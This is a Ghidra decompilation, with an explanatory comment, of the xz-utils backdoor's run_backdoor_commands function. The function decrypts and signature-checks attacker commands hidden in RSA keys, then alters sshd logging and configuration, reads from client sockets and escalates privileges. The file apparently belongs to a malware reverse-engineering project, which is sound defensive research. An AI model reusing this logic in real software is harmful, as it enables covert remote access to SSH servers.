// /home/kali/xzre-ghidra/xzregh/1094A0_run_backdoor_commands.c
// Function: run_backdoor_commands @ 0x1094A0
// Calling convention: unknown
// Prototype: undefined run_backdoor_commands(void)


/*
 * AutoDoc: Central dispatcher invoked from the RSA hooks: it parses the forged modulus, decrypts staged payload chunks, verifies the ED448 signature, toggles sshd configuration/logging, and, if necessary, escalates through `sshd_proxy_elevate`. Every command the backdoor accepts flows through this routine before control returns to libcrypto.
 */
#include "xzre_types.h"


undefined8 run_backdoor_commands(long param_1,long param_2,undefined4 *param_3)

{
  code *pcVar1;
  int *piVar2;
  uint *puVar3;
  byte bVar4;
  uint uVar5;
  int iVar6;
  int iVar7;
  int iVar8;
  ulong uVar9;
  int *piVar10;
  ulong uVar11;
  long lVar12;
  byte bVar13;
  uint uVar14;
  long lVar15;
  ulong uVar16;
  ulong uVar17;
  undefined8 *puVar18;
  long *plVar19;
  undefined4 *puVar20;
  byte bVar21;
  long lVar22;
  ulong uVar23;
  undefined1 *puVar24;
  byte bVar25;
  int *monitor_reqtype_ptr;
  int monitor_reqtype;
  int res;
  ulong f;
  long sigcheck_result;
  int key_idx;
  int data_offset;
  uint delta;
  int num_n_bits;
  undefined1 uStack_5a1;
  ulong uStack_5a0;
  ulong offsets;
  undefined8 tmp;
  undefined8 uStack_588;
  int body_size;
  undefined8 extra_data;
  byte *pbStack_548;
  long data_ptr2;
  long data_index;
  int *v;
  int rsa_n_length;
  long value;
  int body_offset;
  int size;
  long tgt_uid;
  long tgt_gid;
  byte packet_data_size;
  byte bStack_2df;
  byte bStack_2de;
  byte bStack_2dd;
  undefined1 auStack_2dc [3];
  undefined1 auStack_2d9 [2];
  uint auStack_2d7 [3];
  int data_s1;
  int num_n_bytes;
  undefined1 uStack_255;
  undefined1 auStack_254 [465];
  undefined4 body_r8;
  uint uStack_7f;
  undefined4 uStack_7b;
  undefined4 uStack_77;
  int payload_size;
  
  bVar25 = 0;
  plVar19 = &tgt_uid;
  for (lVar12 = 0xae; lVar12 != 0; lVar12 = lVar12 + -1) {
    *(undefined4 *)plVar19 = 0;
    plVar19 = (long *)((long)plVar19 + 4);
  }
  if (param_2 != 0) {
    if ((((*(int *)(param_2 + 0x18) == 0) && (param_1 != 0)) &&
        (lVar12 = *(long *)(param_2 + 8), lVar12 != 0)) &&
       ((pcVar1 = *(code **)(lVar12 + 0x60), pcVar1 != (code *)0x0 &&
        (*(long *)(lVar12 + 0x100) != 0)))) {
      if (param_3 == (undefined4 *)0x0) {
        *(undefined4 *)(param_2 + 0x18) = 1;
        return 0;
      }
      *param_3 = 1;
      (*pcVar1)(param_1,&tgt_uid,&tgt_gid,0);
      if ((((tgt_uid != 0) && (tgt_gid != 0)) &&
          ((*(long *)(param_2 + 8) != 0 &&
           (((pcVar1 = *(code **)(*(long *)(param_2 + 8) + 0x68), pcVar1 != (code *)0x0 &&
             (uVar5 = (*pcVar1)(), uVar5 < 0x4001)) &&
            (uVar5 = uVar5 + 7 >> 3, uVar5 - 0x14 < 0x205)))))) &&
         (iVar6 = (**(code **)(*(long *)(param_2 + 8) + 0x100))(tgt_uid,auStack_2dc + 1), -1 < iVar6
         )) {
        uVar11 = (ulong)uVar5;
        if ((ulong)(long)iVar6 <= uVar11) {
          if ((ulong)(long)iVar6 < 0x11) goto LAB_0010a11a;
          if (((CONCAT13(auStack_2d9[1],stack0xfffffffffffffd25) == 0) || (auStack_2d7[0] == 0)) ||
             (uVar17 = (ulong)CONCAT13(auStack_2d9[1],stack0xfffffffffffffd25) *
                       (ulong)auStack_2d7[0] + CONCAT44(auStack_2d7[2],auStack_2d7[1]), 3 < uVar17))
          goto LAB_0010a11a;
          lVar12 = *(long *)(param_2 + 0x10);
          if (((lVar12 != 0) && (*(long *)(lVar12 + 0x10) != 0)) &&
             ((*(long *)(lVar12 + 0x18) != 0 &&
              ((*(long *)(param_2 + 0x30) != 0 && (*(int *)(param_2 + 0x160) == 0x1c8)))))) {
            body_r8 = CONCAT13(auStack_2d9[1],stack0xfffffffffffffd25);
            uStack_7f = auStack_2d7[0];
            uStack_7b = auStack_2d7[1];
            uStack_77 = auStack_2d7[2];
            iVar6 = secret_data_get_decrypted(&payload_size,param_2);
            if ((iVar6 != 0) &&
               (iVar6 = chacha_decrypt(&data_s1,uVar5 - 0x10,&payload_size,&body_r8,&data_s1,
                                       *(undefined8 *)(param_2 + 8)), iVar6 != 0)) {
              extra_data = 0;
              pbStack_548 = (byte *)0x0;
              piVar10 = &payload_size;
              for (lVar12 = 0x39; lVar12 != 0; lVar12 = lVar12 + -1) {
                *(undefined1 *)piVar10 = 0;
                piVar10 = (int *)((long)piVar10 + (ulong)bVar25 * -2 + 1);
              }
              tmp = 0;
              uStack_588 = 0;
              plVar19 = &data_ptr2;
              for (lVar12 = 0x93; lVar12 != 0; lVar12 = lVar12 + -1) {
                *(undefined4 *)plVar19 = 0;
                plVar19 = (long *)((long)plVar19 + (ulong)bVar25 * -8 + 4);
              }
              plVar19 = *(long **)(param_2 + 0x28);
              piVar10 = &body_size;
              for (lVar12 = 0x29; lVar12 != 0; lVar12 = lVar12 + -1) {
                *(undefined1 *)piVar10 = 0;
                piVar10 = (int *)((long)piVar10 + (ulong)bVar25 * -2 + 1);
              }
              if ((((plVar19 != (long *)0x0) && (plVar19[1] != 0)) && (*(long *)(param_2 + 8) != 0))
                 && (0x71 < uVar11 - 0x10)) {
                iVar6 = (int)uVar17;
                extra_data = CONCAT44(extra_data._4_4_,iVar6);
                if (4 < uVar11 - 0x82) {
                  packet_data_size = (byte)num_n_bytes;
                  bStack_2df = (byte)((uint)num_n_bytes >> 8);
                  bStack_2de = (byte)((uint)num_n_bytes >> 0x10);
                  bStack_2dd = (byte)((uint)num_n_bytes >> 0x18);
                  _auStack_2dc = CONCAT31(stack0xfffffffffffffd25,uStack_255);
                  f = uVar11 - 0x87;
                  if (uVar17 == 2) {
                    uVar9 = (ulong)CONCAT11(uStack_255,bStack_2dd);
                    if ((char)packet_data_size < '\0') {
                      if (CONCAT11(uStack_255,bStack_2dd) != 0) goto LAB_0010a112;
                      uVar16 = 0;
                      uVar9 = 0x39;
                      puVar24 = auStack_254;
                      lVar12 = 0;
                    }
                    else {
                      if ((num_n_bytes & 0x100U) != 0) {
                        uVar9 = uVar9 + 8;
                      }
                      puVar24 = (undefined1 *)0x0;
                      lVar12 = 0x87;
                      uVar16 = uVar9;
                    }
                    if (f < uVar9) goto LAB_0010a112;
                    sigcheck_result = uVar9 + 5;
                    f = f - uVar9;
                    uVar23 = uVar9 + 0x87;
                    iVar7 = (int)uVar9 + 4;
                  }
                  else if ((iVar6 == 3) && ((num_n_bytes & 0x4000U) == 0)) {
                    if (f < 0x30) goto LAB_0010a112;
                    uVar16 = 0x30;
                    lVar12 = 0x87;
                    puVar24 = (undefined1 *)0x0;
                    sigcheck_result = 0x35;
                    uVar23 = 0x87;
                    iVar7 = 0x34;
                  }
                  else {
                    uVar16 = 0;
                    lVar12 = 0;
                    uVar23 = 0x87;
                    puVar24 = (undefined1 *)0x0;
                    sigcheck_result = 5;
                    iVar7 = 4;
                  }
                  piVar10 = &num_n_bytes;
                  puVar20 = (undefined4 *)((long)&extra_data + 4);
                  for (uVar9 = (ulong)(iVar7 + 1); uVar9 != 0; uVar9 = uVar9 - 1) {
                    *(char *)puVar20 = (char)*piVar10;
                    piVar10 = (int *)((long)piVar10 + (ulong)bVar25 * -2 + 1);
                    puVar20 = (undefined4 *)((long)puVar20 + (ulong)bVar25 * -2 + 1);
                  }
                  uStack_5a0 = 0;
                  lVar22 = *plVar19;
                  offsets = 0;
                  if (((lVar22 != 0) && (plVar19[1] != 0)) &&
                     ((lVar22 != plVar19[1] &&
                      ((((*(uint *)(plVar19 + 3) < 2 &&
                         (iVar7 = count_pointers(lVar22,&uStack_5a0,*(undefined8 *)(param_2 + 0x10))
                         , iVar7 != 0)) &&
                        (iVar7 = count_pointers(*(undefined8 *)(*(long *)(param_2 + 0x28) + 8),
                                                &offsets,*(undefined8 *)(param_2 + 0x10)),
                        uVar9 = uStack_5a0, iVar7 != 0)) && (uStack_5a0 == offsets)))))) {
                    iVar7 = secret_data_get_decrypted(&tmp,param_2);
                    if (iVar7 != 0) {
                      lVar22 = 0;
                      do {
                        delta = (uint)uVar9;
                        uVar5 = (uint)lVar22;
                        if (delta <= uVar5) goto LAB_0010a112;
                        lVar15 = *(long *)(*(long *)(param_2 + 0x28) + 8);
                        iVar7 = verify_signature(*(undefined8 *)(lVar15 + lVar22 * 8),&extra_data,
                                                 sigcheck_result + 4,0x25c,&data_s1,&tmp,param_2,
                                                 lVar15);
                        lVar22 = lVar22 + 1;
                      } while (iVar7 == 0);
                      *(uint *)(param_2 + 0x100) = uVar5;
                      if ((uVar17 != 2) || (-1 < (char)packet_data_size)) {
                        if (lVar12 == 0) {
LAB_00109a97:
                          if (uVar23 <= uVar11) goto LAB_00109aa2;
                        }
                        else {
                          uVar23 = 0x87;
LAB_00109aa2:
                          if (uVar16 <= uVar11 - uVar23) {
                            if ((((packet_data_size & 4) == 0) || (*(long *)(param_2 + 0x10) == 0))
                               || (pcVar1 = *(code **)(*(long *)(param_2 + 0x10) + 0x58),
                                  pcVar1 == (code *)0x0)) {
                              *(undefined4 *)(*(long *)(param_2 + 0x30) + 8) = 0;
                              if ((packet_data_size & 5) == 5) goto LAB_0010a1ba;
                            }
                            else {
                              (*pcVar1)();
                              *(undefined4 *)(*(long *)(param_2 + 0x30) + 8) = 1;
                            }
                            iVar7 = (**(code **)(*(long *)(param_2 + 0x10) + 0x10))();
                            bVar4 = packet_data_size;
                            *(int *)(param_2 + 0x90) = iVar7;
                            bVar21 = packet_data_size & 0x10;
                            if (((bVar21 == 0) || (*(int *)(*(long *)(param_2 + 0x30) + 4) != 0)) &&
                               (((packet_data_size & 2) == 0 ||
                                ((iVar8 = sshd_configure_log_hook(&packet_data_size,param_2),
                                 iVar8 != 0 || (bVar21 == 0)))))) {
                              if (uVar17 == 0) {
                                if (((char)bStack_2df < '\0') ||
                                   (*(long *)(*(long *)(param_2 + 0x20) + 200) != 0)) {
                                  bVar21 = 0xff;
                                  if ((bStack_2df & 2) != 0) {
                                    bVar21 = (byte)(CONCAT11(bStack_2dd,bStack_2de) >> 6) & 0x7f;
                                  }
                                  bVar13 = 0xff;
                                  if ((char)bVar4 < '\0') {
                                    bVar13 = (byte)(((ulong)CONCAT41(_auStack_2dc,bStack_2dd) <<
                                                    0x18) >> 0x1d) & 0x1f;
                                  }
                                  uVar5 = (uint)CONCAT11(bVar13,bVar21);
                                  if ((bStack_2df & 4) == 0) {
LAB_00109c56:
                                    uVar5 = uVar5 | 0xff0000;
                                    uVar14 = 0xff;
                                  }
                                  else {
                                    uVar14 = (uint)(auStack_2dc[0] >> 5);
                                    uVar5 = uVar5 | (auStack_2dc[0] >> 2 & 7) << 0x10;
                                  }
LAB_00109c7b:
                                  uVar5 = uVar5 | uVar14 << 0x18;
LAB_00109c8a:
                                  *(uint *)(param_2 + 0x54) = uVar5;
                                  piVar10 = (int *)(auStack_2dc + uVar23 + 1);
                                  if (iVar7 == 0) {
                                    lVar12 = *(long *)(param_2 + 0x10);
                                    if ((((lVar12 != 0) &&
                                         (*(code **)(lVar12 + 0x20) != (code *)0x0)) &&
                                        (*(long *)(lVar12 + 0x28) != 0)) &&
                                       (*(long *)(lVar12 + 0x30) != 0)) {
                                      if (uVar17 == 0) {
                                        piVar10 = *(int **)(param_2 + 0x20);
                                        if (((piVar10 != (int *)0x0) &&
                                            (*(long *)(piVar10 + 0x16) != 0)) && (*piVar10 != 0)) {
                                          if ((char)bStack_2df < '\0') goto LAB_00109d36;
                                          piVar2 = *(int **)(piVar10 + 0x32);
                                          if (piVar2 != (int *)0x0) {
                                            iVar6 = *piVar2;
                                            if (iVar6 < 3) {
                                              if (-1 < iVar6) {
                                                *piVar2 = 3;
LAB_00109d36:
                                                if ((bVar4 & 0x40) != 0) {
                                                  puVar3 = *(uint **)(piVar10 + 0x30);
                                                  if ((puVar3 == (uint *)0x0) || (1 < *puVar3))
                                                  goto LAB_0010a1ba;
                                                  *puVar3 = 0;
                                                }
                                                uStack_5a0 = CONCAT44(uStack_5a0._4_4_,0xffffffff);
                                                if ((bVar4 & 0x20) == 0) {
                                                  iVar6 = sshd_get_client_socket
                                                                    (param_2,&uStack_5a0,1,1);
                                                }
                                                else {
                                                  iVar6 = sshd_get_usable_socket
                                                                    (&uStack_5a0,
                                                                     bStack_2df >> 3 & 0xf,lVar12);
                                                }
                                                uVar11 = uStack_5a0;
                                                if (iVar6 != 0) {
                                                  iVar6 = (int)uStack_5a0;
                                                  uStack_5a1 = 0;
                                                  offsets = offsets & 0xffffffff00000000;
                                                  tmp = 0;
                                                  uStack_588 = 0;
                                                  if (((-1 < (int)uStack_5a0) &&
                                                      (lVar12 = *(long *)(param_2 + 0x10),
                                                      lVar12 != 0)) &&
                                                     ((*(long *)(lVar12 + 0x40) != 0 &&
                                                      (*(long *)(lVar12 + 0x50) != 0)))) {
                                                    iVar7 = (int)uStack_5a0 >> 6;
                                                    uVar17 = 1L << ((byte)uStack_5a0 & 0x3f);
                                                    do {
                                                      uStack_588 = 500000000;
                                                      puVar18 = &extra_data;
                                                      for (lVar22 = 0x20; lVar22 != 0;
                                                          lVar22 = lVar22 + -1) {
                                                        *(undefined4 *)puVar18 = 0;
                                                        puVar18 = (undefined8 *)
                                                                  ((long)puVar18 +
                                                                  (ulong)bVar25 * -8 + 4);
                                                      }
                                                      (&extra_data)[iVar7] = uVar17;
                                                      tmp = 0;
                                                      iVar8 = (**(code **)(lVar12 + 0x40))
                                                                        (iVar6 + 1,&extra_data,0,0,
                                                                         &tmp,0);
                                                      if (-1 < iVar8) {
                                                        if (((iVar8 != 0) &&
                                                            ((uVar17 & (&extra_data)[iVar7]) != 0))
                                                           && (lVar22 = fd_read(uVar11 & 0xffffffff,
                                                                                &offsets,4,lVar12),
                                                              -1 < lVar22)) {
                                                          uVar5 = (uint)offsets >> 0x18 |
                                                                  ((uint)offsets & 0xff0000) >> 8 |
                                                                  ((uint)offsets & 0xff00) << 8 |
                                                                  (uint)offsets << 0x18;
                                                          offsets = CONCAT44(offsets._4_4_,uVar5);
                                                          if ((uVar5 - 1 < 0x41) &&
                                                             (lVar22 = fd_read(uVar11 & 0xffffffff,
                                                                               &uStack_5a1,1,lVar12)
                                                             , -1 < lVar22)) {
                                                            *(ulong *)(param_2 + 0x98) =
                                                                 (ulong)((uint)offsets - 1);
                                                            lVar12 = fd_read(uVar11 & 0xffffffff,
                                                                             param_2 + 0xa0,
                                                                             (ulong)((uint)offsets -
                                                                                    1),lVar12);
                                                            if (-1 < lVar12) {
                                                              lVar12 = *(long *)(param_2 + 0x20);
                                                              if (*(long *)(lVar12 + 0x18) != 0) {
                                                                plVar19 = *(long **)(lVar12 + 0x58);
                                                                if ((bStack_2de & 0x3f) == 0) {
                                                                  iVar6 = 0x16;
                                                                  if (plVar19 != (long *)0x0) {
                                                                    iVar6 = (int)plVar19[-1];
                                                                  }
                                                                }
                                                                else {
                                                                  iVar6 = (uint)(bStack_2de & 0x3f)
                                                                          * 2;
                                                                }
                                                                *(int *)(lVar12 + 0x60) = iVar6 + 1;
                                                                *plVar19 = *(long *)(lVar12 + 0x18);
                                                                goto LAB_0010a076;
                                                              }
                                                            }
                                                          }
                                                        }
                                                        break;
                                                      }
                                                      piVar10 = (int *)(**(code **)(lVar12 + 0x50))
                                                                                 ();
                                                    } while (*piVar10 == 4);
                                                  }
                                                }
                                              }
                                            }
                                            else if (iVar6 == 3) goto LAB_00109d36;
                                          }
                                        }
                                      }
                                      else if (iVar6 == 1) {
                                        iVar6 = sshd_patch_variables
                                                          (bStack_2df & 1,packet_data_size >> 6 & 1,
                                                           bStack_2df >> 1 & 1,bStack_2dd,param_2);
                                        if (iVar6 != 0) {
LAB_0010a076:
                                          tmp = CONCAT71(tmp._1_7_,1);
                                          pbStack_548 = (byte *)0x0;
                                          plVar19 = &data_ptr2;
                                          for (lVar12 = 0x3c; lVar12 != 0; lVar12 = lVar12 + -1) {
                                            *(undefined4 *)plVar19 = 0;
                                            plVar19 = (long *)((long)plVar19 +
                                                              (ulong)bVar25 * -8 + 4);
                                          }
                                          extra_data = 0x80;
                                          body_offset._0_1_ = 8;
                                          size._0_1_ = 1;
                                          lVar12 = (**(code **)(*(long *)(param_2 + 8) + 0xe0))
                                                             (&tmp,1,0);
                                          if (((lVar12 != 0) &&
                                              (lVar22 = (**(code **)(*(long *)(param_2 + 8) + 0xe0))
                                                                  (&extra_data,0x100,0), lVar22 != 0
                                              )) && (iVar6 = (**(code **)(*(long *)(param_2 + 8) +
                                                                         0xe8))(param_1,lVar22,
                                                                                lVar12,0),
                                                    iVar6 == 1)) goto LAB_0010a112;
                                        }
                                      }
                                      else if (iVar6 == 2) {
                                        uVar16 = uVar16 & 0xffff;
                                        if ((bStack_2df & 1) == 0) {
                                          iVar7 = 0;
                                          lVar22 = 0;
                                          iVar6 = 0;
                                        }
                                        else {
                                          if (uVar16 < 9) goto LAB_0010a1ba;
                                          iVar6 = *piVar10;
                                          iVar7 = *(int *)((long)auStack_2d7 + uVar23);
                                          uVar16 = uVar16 - 8;
                                          lVar22 = 8;
                                        }
                                        if ((char)bVar4 < '\0') {
                                          if (2 < uVar16) {
                                            uVar11 = (ulong)*(ushort *)((long)piVar10 + lVar22);
                                            uVar16 = uVar16 - 2;
                                            lVar22 = lVar22 + 2;
                                            if (uVar16 <= uVar11) goto LAB_00109fb9;
                                          }
                                        }
                                        else {
                                          uVar11 = (ulong)CONCAT11(auStack_2dc[0],bStack_2dd);
LAB_00109fb9:
                                          if ((((uVar11 <= uVar16) &&
                                               ((iVar7 == 0 ||
                                                (iVar7 = (**(code **)(lVar12 + 0x20))
                                                                   (iVar7,iVar7,iVar7), iVar7 != -1)
                                                ))) && ((iVar6 == 0 ||
                                                        (iVar6 = (**(code **)(*(long *)(param_2 +
                                                                                       0x10) + 0x28)
                                                                 )(iVar6,iVar6,iVar6), iVar6 != -1))
                                                       )) &&
                                             (*(char *)((long)piVar10 + lVar22) != '\0')) {
                                            (**(code **)(*(long *)(param_2 + 0x10) + 0x30))();
                                            goto LAB_0010a076;
                                          }
                                        }
                                      }
                                      else if ((((bStack_2df & 0xc0) == 0xc0) &&
                                               (*(long *)(lVar12 + 0x18) != 0)) &&
                                              (*(code **)(lVar12 + 0x40) != (code *)0x0)) {
                                        pbStack_548 = (byte *)0x0;
                                        extra_data = 5;
                                        (**(code **)(lVar12 + 0x40))(0,0,0,0,&extra_data,0);
                                        (**(code **)(lVar12 + 0x18))(0);
                                      }
                                    }
                                  }
                                  else {
                                    puVar20 = (undefined4 *)((long)&extra_data + 4);
                                    for (lVar12 = 0xb; lVar12 != 0; lVar12 = lVar12 + -1) {
                                      *puVar20 = 0;
                                      puVar20 = puVar20 + (ulong)bVar25 * -2 + 1;
                                    }
                                    pbStack_548 = &packet_data_size;
                                    extra_data = CONCAT44(extra_data._4_4_,iVar6);
                                    data_ptr2 = tgt_uid;
                                    data_index = tgt_gid;
                                    v = piVar10;
                                    rsa_n_length._0_2_ = (short)uVar16;
                                    value = param_1;
                                    iVar6 = sshd_proxy_elevate(&extra_data,param_2);
                                    if (iVar6 != 0) {
                                      *(undefined4 *)(param_2 + 0x18) = 1;
                                      *param_3 = 0;
                                      return 1;
                                    }
                                  }
                                }
                              }
                              else if (iVar6 == 1) {
                                if (((bStack_2df & 1) != 0) ||
                                   (*(long *)(*(long *)(param_2 + 0x20) + 200) != 0))
                                goto LAB_00109b6c;
                              }
                              else {
                                if (iVar6 != 3) {
LAB_00109b6c:
                                  uVar5 = 0;
                                  goto LAB_00109c8a;
                                }
                                if (((char)bStack_2dd < '\0') ||
                                   (*(long *)(*(long *)(param_2 + 0x20) + 200) != 0)) {
                                  if ((bStack_2de & 0x20) != 0) {
                                    bVar21 = 0xff;
                                    if ((char)bStack_2de < '\0') {
                                      bVar21 = auStack_2dc[0];
                                    }
                                    bVar13 = 0xff;
                                    if ((bStack_2de & 0x40) != 0) {
                                      bVar13 = bStack_2dd & 0x3f;
                                    }
                                    uVar5 = (uint)CONCAT11(bVar13,bVar21);
                                    if ((bStack_2dd & 0x40) == 0) goto LAB_00109c56;
                                    uVar14 = bStack_2df >> 3 & 7;
                                    uVar5 = uVar5 | (bStack_2df & 7) << 0x10;
                                    goto LAB_00109c7b;
                                  }
                                  uVar5 = 0xffffffff;
                                  goto LAB_00109c8a;
                                }
                              }
                            }
                          }
                        }
LAB_0010a1ba:
                        *(undefined4 *)(param_2 + 0x18) = 1;
                        piVar10 = &payload_size;
                        for (lVar12 = 0x39; lVar12 != 0; lVar12 = lVar12 + -1) {
                          *(undefined1 *)piVar10 = 0;
                          piVar10 = (int *)((long)piVar10 + (ulong)bVar25 * -2 + 1);
                        }
                        if ((packet_data_size & 1) != 0) {
                          if (*(long *)(param_2 + 0x10) == 0) {
                            return 0;
                          }
                          pcVar1 = *(code **)(*(long *)(param_2 + 0x10) + 0x18);
                          if (pcVar1 == (code *)0x0) {
                            return 0;
                          }
                          (*pcVar1)(0);
                          return 0;
                        }
                        goto LAB_0010a11a;
                      }
                      if (puVar24 != (undefined1 *)0x0) {
                        if ((bStack_2df & 1) == 0) {
                          lVar12 = 0;
                        }
                        else {
                          lVar12 = 8;
                          if (f < 9) goto LAB_0010a112;
                        }
                        if (((lVar12 + 2U <= f) &&
                            (uVar16 = (ulong)*(ushort *)(auStack_2dc + uVar23 + lVar12 + 1) +
                                      lVar12 + 2U, uVar16 < f)) && (0x71 < f - uVar16)) {
                          if (((*(ulong *)(param_2 + 0xe8) <= *(ulong *)(param_2 + 0xe0)) &&
                              (uVar9 = *(ulong *)(param_2 + 0xe0) - *(ulong *)(param_2 + 0xe8),
                              0x38 < uVar9)) && (uVar16 <= uVar9 - 0x39)) {
                            lVar12 = *(long *)(param_2 + 0xf0);
                            uVar9 = 0;
                            do {
                              *(undefined1 *)(lVar12 + uVar9) = auStack_2dc[uVar9 + uVar23 + 1];
                              uVar9 = uVar9 + 1;
                            } while (uVar16 != uVar9);
                            lVar12 = *(long *)(*(long *)(param_2 + 0x28) + 8);
                            lVar15 = *(long *)(param_2 + 0xe8) + uVar16;
                            *(long *)(param_2 + 0xe8) = lVar15;
                            iVar7 = verify_signature(*(undefined8 *)
                                                      (lVar12 + (ulong)*(uint *)(param_2 + 0x100) *
                                                                8),*(undefined8 *)(param_2 + 0xf0),
                                                     lVar15,*(undefined8 *)(param_2 + 0xe0),
                                                     auStack_2dc + uVar16 + uVar23 + 1,puVar24,
                                                     param_2,lVar22);
                            if (iVar7 != 0) goto LAB_00109a97;
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
LAB_0010a112:
      *(undefined4 *)(param_2 + 0x18) = 1;
      goto LAB_0010a11a;
    }
    *(undefined4 *)(param_2 + 0x18) = 1;
  }
  if (param_3 == (undefined4 *)0x0) {
    return 0;
  }
LAB_0010a11a:
  *param_3 = 1;
  return 0;
}

